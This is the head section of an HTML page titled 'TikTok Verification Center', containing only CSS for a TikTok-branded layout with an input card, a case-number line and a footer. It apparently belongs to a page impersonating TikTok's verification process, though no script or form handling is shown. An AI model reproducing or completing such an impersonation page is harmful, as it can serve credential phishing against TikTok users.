<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Verification Center</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
        }

        .header-content {
            width: 100%;
            background: #000;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            margin-bottom: 20px;
        }

        .hamburger-wrapper {
            display: flex;
            align-items: center;
        }

        .hamburger-menu {
            cursor: pointer;
            padding: 10px;
        }

        .hamburger-menu-wrapper {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 24px;
            height: 16px;
        }

        .hamburger-menu-wrapper span {
            width: 100%;
            height: 2px;
            background: #fff;
            transition: all 0.3s;
        }

        .logo-container {
            margin-left: 15px;
        }

        .logo-link {
            display: flex;
            align-items: center;
            text-decoration: none;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            margin-right: 10px;
        }

        .logo-text {
            height: 20px;
            margin-right: 10px;
        }

        .logo-link strong {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
        }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 60vh;
            margin-bottom: 40px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
            display: none;
            border: 2px solid #ff0050;
        }

        .container.active {
            display: block;
        }

        .logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
        }

        h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 24px;
        }

        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .form-label {
            display: block;
            text-align: left;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e1e1;
            border-radius: 10px;
            margin-bottom: 15px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #ff0050;
            outline: none;
        }

        button {
            width: 100%;
            padding: 15px;
            background: #ff0050;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #e6004a;
        }

        .case-number {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }

        .footer {
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #eee;
            font-size: 12px;
            color: #999;
        }

        .footer-container {
            width: 100vw;
            margin-left: calc(-50vw + 50%);
            background-color: #000;
            color: #fff;
            margin-top: 60px;
        }

        .download-container {
            background-color: #000;
            padding: 48px 24px 24px;
        }

        .download-content {
            max-width: 1200px;
            margin: 0 auto;
            text-align: center;
        }

        .download-content h2 {
            color: #fff;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 32px;
        }

        .download-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .qr-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 16px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .qr-btn:hover {
            background-color: rgba(255,255,255,0.1);
        }

        .qr-image {
            width: 24px;
            height: 24px;
        }

        .qr-btn span {
            color: #fff;
            font-size: 14px;
            font-weight: 600;
        }

        .download-wrapper a {
            display: inline-block;
        }

        .download-wrapper img {
            height: 48px;
            width: auto;
            transition: opacity 0.3s;
        }

        .download-wrapper img:hover {
            opacity: 0.8;
        }

        .ms-image-wrapper {
            display: inline-block;
        }

        .footer-content-wrapper {
            background-color: #000;
            padding: 48px 24px 24px;
            display: flex;
            max-width: 1200px;
            margin: 0 auto;
            gap: 48px;
            flex-wrap: wrap;
        }

        .tiktok-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
            flex-basis: 100%;
        }

        .logo-container {
            display: inline-block;
        }

        .logo-group {
            height: 32px;
            width: auto;
        }

        .tiktok-logo strong {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
        }

        .footer-content-column {
            flex: 1;
            min-width: 200px;
        }

        .footer-content-column h4 {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .footer-content-column h5 {
            margin-bottom: 8px;
        }

        .footer-content-column a {
            color: rgba(255,255,255,0.75);
            text-decoration: none;
            font-size: 14px;
            font-weight: 400;
            transition: color 0.3s;
        }

        .footer-content-column a:hover {
            color: #fff;
        }

        .footer-bottom-wrapper {
            background-color: #000;
            padding: 24px;
            border-top: 1px solid rgba(255,255,255,0.12);
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            flex-wrap: wrap;
            gap: 16px;
        }

        .language-selection {
            position: relative;
            padding: 8px 32px 8px 12px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 4px;
            cursor: pointer;
        }

        .language-selection p {
            color: rgba(255,255,255,0.75);
            font-size: 14px;
        }

        .language-selection-form {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }

        .copyright {
            color: rgba(255,255,255,0.5);
            font-size: 14px;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
        }

        .modal-wrapper {
            position: relative;
            width: 100%;
            height: 100%;
        }

        .modal-mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }

        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 32px;
            border-radius: 8px;
            text-align: center;
            max-width: 300px;
        }

        .close {
            position: absolute;
            top: 12px;
            right: 12px;
            width: 24px;
            height: 24px;
            cursor: pointer;
        }

        .close:before, .close:after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 16px;
            height: 2px;
            background: #333;
            transform: translate(-50%, -50%) rotate(45deg);
        }

        .close:after {
            transform: translate(-50%, -50%) rotate(-45deg);
        }

        .qr-title {
            margin-bottom: 16px;
            font-size: 16px;
            font-weight: 600;
            color: #333;
        }

        .qr-img {
            width: 150px;
            height: 150px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }
            
            .footer-content-wrapper {
                flex-direction: column;
                gap: 24px;
            }
            
            .footer-bottom-wrapper {
                flex-direction: column;
                text-align: center;
            }
            
            .download-content h2 {
                font-size: 24px;
            }

            .header-content {
                flex-direction: column;
                align-items: flex-start;
            }
        }
    </style>
</head>
